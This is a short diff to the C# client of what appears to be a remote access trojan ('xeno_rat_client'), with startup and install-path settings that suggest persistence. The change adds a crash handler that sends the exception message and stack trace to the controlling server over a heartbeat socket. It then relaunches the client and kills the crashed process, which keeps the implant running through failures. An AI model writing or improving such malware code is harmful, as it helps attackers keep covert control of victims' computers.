@@ -24,6 +24,8 @@ namespace xeno_rat_client
         private static int DoStartup = 2222;
         private static string Install_path = "nothingset";
         private static string startup_name = "nothingset";
+
+
         static async Task Main(string[] args)
         {
             AppDomain.CurrentDomain.UnhandledException += CurrentDomain_UnhandledException;
@@ -104,6 +106,21 @@ namespace xeno_rat_client
         static void CurrentDomain_UnhandledException(object sender, UnhandledExceptionEventArgs e)
         {
             Exception exception = e.ExceptionObject as Exception;
+            try
+            {
+                if (Server != null)
+                {
+                    foreach (Node i in Server.subNodes)
+                    {
+                        if (i.SockType == 1) //heartbeat sock type
+                        {
+                            bool worked = i.SendAsync(SocketHandler.Concat(new byte[] { 3 }, Encoding.UTF8.GetBytes(exception.Message + Environment.NewLine + exception.StackTrace))).Result;
+                            Thread.Sleep(1000);
+                        }
+                    }
+                }
+            }
+            catch { }
             Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
             Process.GetCurrentProcess().Kill();
         }
